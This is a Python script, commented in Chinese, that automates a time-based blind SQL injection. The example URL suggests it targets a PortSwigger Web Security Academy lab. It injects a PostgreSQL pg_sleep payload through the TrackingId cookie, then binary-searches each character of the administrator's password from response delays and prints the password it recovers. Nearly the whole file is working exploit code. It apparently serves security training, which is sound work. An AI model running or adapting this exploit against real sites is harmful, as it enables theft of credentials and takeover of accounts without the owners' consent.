import string
from urllib.parse import urljoin

import requests
from tqdm import tqdm


def cmp_passwd(idx, cmp_opt, tg_char):
    '''
    發起 sqli 請求，根據輸入的 idx 、比較運算子，與目標字元 (tg_char) 比較，回傳比較結果。
    :param idx: substr 的起始 idx。
    :param cmp_opt: 比較運算子 (>, <, =)。
    :param tg_char: 比較的目標字元 (a-z, 0-9)。
    :return: 回傳比較結果 (True/False)。
    '''
    # 設定 delay 時間
    delay_time = 8

    url = urljoin(TARGET, 'login')

    sqli_payload = f"'%3b " \
                   f"SELECT CASE WHEN (" \
                   f"(SELECT COUNT(username) FROM users WHERE username = 'administrator' AND " \
                   f"SUBSTRING(password, {idx}, 1){cmp_opt}'{tg_char}')=1)" \
                   f" THEN pg_sleep({delay_time}) ELSE pg_sleep(0) END--"

    headers = {
        "Cookie": f"TrackingId={TRACKING_ID}{sqli_payload}"
    }

    r = requests.get(url, headers=headers)

    # 回應時間大於/等於 delay 時間，代表猜對密碼， 回傳 True
    return r.elapsed.total_seconds() >= delay_time


def get_passwd_char(idx, word_list):
    '''
    以 2 元搜尋的方式，找出此 idx 位置的密碼字元。
    :param idx: 要查找的密碼字元位置。
    :param word_list: 字元串列 ex. [a-z]。
    :return: 如果有找到，回傳密碼字元，否則回傳 -1。
    '''
    left = 0
    right = len(word_list) - 1
    while left <= right:
        mid = (left + right) // 2
        if cmp_passwd(idx, '<', word_list[mid]):
            right = mid - 1
        elif cmp_passwd(idx, '>', word_list[mid]):
            left = mid + 1
        else:
            return word_list[mid]
    return -1


if __name__ == '__main__':
    # 設定目標網址, ex. https://abcdefg12345678.web-security-academy.net
    TARGET = '<URL>'

    # 設定 TrackingId (從 cookies 取得), ex. xyz1234abc
    TRACKING_ID = '<TRACKING_ID>'

    # 預設密碼長度為 20, word list 為 [0-9a-z]
    passwd_len = 20
    word_list = string.digits + string.ascii_lowercase

    # 一次取得一個密碼字元
    passwd = ''
    for i in tqdm(range(1, passwd_len + 1)):
        ch = get_passwd_char(i, word_list)
        if ch == -1: raise ValueError('密碼字元未存在 word list 中')
        passwd += ch

    # 顯示完整密碼
    print(passwd)
